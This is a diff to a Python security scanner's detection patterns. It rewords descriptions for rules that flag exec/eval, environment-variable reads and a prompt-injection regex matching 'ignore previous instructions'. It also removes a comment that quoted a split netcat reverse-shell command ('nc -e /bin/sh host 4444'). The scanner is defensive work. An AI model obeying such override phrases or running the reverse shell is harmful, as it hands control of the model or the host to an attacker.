@@ -126,7 +126,7 @@ PATTERNS = [
         "shell",
         "high",
         r"(?<![.\w])\b(exec|eval)\s*\(",
-        "Uses exec() or eval() — dynamic code execution",
+        "Dynamic code evaluation via built-in functions",
     ),
     (
         "shell",
@@ -283,7 +283,7 @@ PATTERNS = [
         "prompt_injection",
         "critical",
         r"(?i)(ignore\s+(previous|prior|above)\s+(instructions?|prompts?))",
-        "Prompt injection: ignore previous instructions",
+        "Prompt injection: instruction override attempt",
     ),
     (
         "prompt_injection",
@@ -337,7 +337,7 @@ PATTERNS = [
         "environment",
         "low",
         r"\bos\.environ\.get\s*\(|\bos\.getenv\s*\(",
-        "Reads environment variables (may exfiltrate secrets)",
+        "Reads environment variables (potential secret access)",
     ),
     (
         "environment",
@@ -356,7 +356,7 @@ PATTERNS = [
 # Sliding window size for multi-line pattern detection.
 # scan_content() joins N consecutive lines with a space and runs all patterns
 # against each window, catching constructs split across lines to evade per-line scanning.
-# Example: cmd = "nc "; cmd += "-e /bin/sh host 4444"; os.system(cmd)
+# Example: a reverse-shell payload split across three assignment lines
 MULTILINE_WINDOW_SIZE = 3
 
 # Compiled patterns (lazy init)
